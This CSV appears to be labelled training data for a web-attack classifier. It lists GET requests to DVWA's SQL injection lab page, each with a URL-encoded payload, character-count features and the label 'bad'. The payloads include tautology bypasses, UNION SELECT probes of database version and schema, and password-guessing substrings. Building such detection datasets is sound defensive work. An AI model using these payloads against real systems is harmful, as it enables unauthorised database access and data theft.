Method,Path,Body,Single Quotes,Double Quotes,Dashes,Braces,Spaces,Tags,Colons,Backtick,Bad Words,XSS Check,XSS Word,Class
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%200%3D0%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,3,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%200%3D0%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,3,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%200%3D0%20%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,3,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%25%27%20or%20%270%27%3D%270&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%271%C3%A2%E2%82%AC%C2%B2%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,3,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1%20%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,3,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1%3B%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%271%27%3D%271--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,1,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%28%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%28%271%27%3D%271--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,1,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%28%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%28%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%28%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27or%271%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27or%271%3D1%C3%A2%E2%82%AC%C2%B2&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%221%22%3D%221%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%201%3D1%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,3,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%201%3D1%20%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,3,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%201%3D1%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%221%22%3D%221%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%28%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%28%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%28%221%22%3D%221%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%28%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%29%20or%20%271%C3%A2%E2%82%AC%C2%B2%3D%271%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%29%20or%20%28%271%C3%A2%E2%82%AC%C2%B2%3D%271%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%3D1%20LIMIT%201%3B%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,4,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27or%201%3D1%20or%20%27%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,3,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22or%201%3D1%20or%20%22%22%3D%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,3,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20a%3Da--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20a%3Da%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%22a%22%3D%22a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%28%22a%22%3D%22a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,2,0,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%28%27a%27%3D%27a%20and%20hi%22%29%20or%20%28%22a%22%3D%22a&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,4,0,2,6,0,0,0,1,0,1,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27one%27%3D%27one&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27one%27%3D%27one%C3%A2%E2%82%AC%E2%80%9C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20uid%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,0,0,0,2,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20uname%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20userid%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20user%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20username%20like%20%27%25&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%28%27x%27%3D%27x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20OR%20%27x%27%3D%27x%27%23%3B&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%3D%27%20%27or%27%20and%20%27%3D%27%20%27or%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,8,0,0,0,4,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20ALL%20SELECT%201%2C%20%40%40version%3B%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,5,0,1,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20ALL%20SELECT%20system_user%28%29%2Cuser%28%29%3B%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,2,4,0,1,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20select%20table_schema%2Ctable_name%20FROM%20information_Schema%2etables%3B%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,5,0,1,0,3,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20and%20substring%28password%2ftext%28%29%2C1%2C1%29%3D%277&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%20and%20substring%28password%2ftext%28%29%2C1%2C1%29%3D%277&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,2,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%27%26lt%3B%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%3D%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%22%26lt%3B%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29-%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%26%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%5E%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%2A%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%3D%28%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%27%29%26lt%3B%28%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,0,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29-%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%26%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%5E%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%2A%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%3D%28%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%22%29%26lt%3B%28%222&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,1,0,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27-%27%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27-%27%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27-%27%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%26%27%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%26%27%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%26%27%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%5E%27%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%5E%27%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%5E%27%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%2A%27%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%2A%27%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%2A%27%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%3D%27%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%3D%27%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%3D%27%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%27%26lt%3B%272%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,1,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%27%26lt%3B%272%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%27%26lt%3B%272%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22-%22%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22-%22%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22-%22%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%26%22%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%26%22%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%26%22%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%5E%22%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%5E%22%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%5E%22%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%2A%22%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%2A%22%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%2A%22%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%3D%22%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%3D%22%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%22%3D%22%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%22%26lt%3B%222%22--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,1,0,1,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%22%26lt%3B%222%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=0%22%26lt%3B%222%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,3,0,0,0,0,1,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29-%27%27--%202&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,1,0,1,0,0,0,1,0,0,bad
GET,/DVWA/vulnerabilities/sqli/?id=%27%29-%27%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,3,0,0,0,0,0,0,0,1,0,0,bad
